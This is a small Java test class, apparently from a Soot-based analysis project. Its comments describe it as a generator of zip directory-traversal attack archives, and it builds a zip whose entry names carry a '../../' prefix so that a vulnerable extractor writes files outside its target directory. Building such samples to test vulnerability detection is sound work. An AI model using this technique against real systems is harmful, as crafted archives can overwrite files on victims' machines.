package com.nii.soot.test;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * 生成zip目录遍历攻击包
 * @author wzj
 * @create 2018-07-07 22:13
 **/
public class GenerateZipVulnTest
{
    public static void main(String[] args) throws IOException
    {
        List<String> filePathList = new ArrayList<String>();
        filePathList.add("C:\\Users\\wzj\\Desktop\\ww\\1.txt");
        filePathList.add("C:\\Users\\wzj\\Desktop\\ww\\2.txt");
        generateZip("C:\\Users\\wzj\\Desktop\\ww\\test.zip",filePathList);
    }

    /**
     * 生成zip目录遍历攻击压缩包
     * @param zipPath zip目录
     * @param filePathList 要压缩的文件列表
     */
    public static void generateZip(String zipPath,List<String> filePathList) throws IOException
    {
        OutputStream outputStream = new FileOutputStream(new File(zipPath));
        ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream);
        byte[] buffer = new byte[1024];

        for (String filePath : filePathList)
        {
            FileInputStream fileInputStream = new FileInputStream(filePath);
            zipOutputStream.putNextEntry(new ZipEntry("../../" + filePath));

            int len = 0;
            while ((len = fileInputStream.read(buffer)) != -1)
            {
                zipOutputStream.write(buffer,0,len);
            }

            zipOutputStream.closeEntry();
            fileInputStream.close();
        }

        zipOutputStream.close();
    }
}
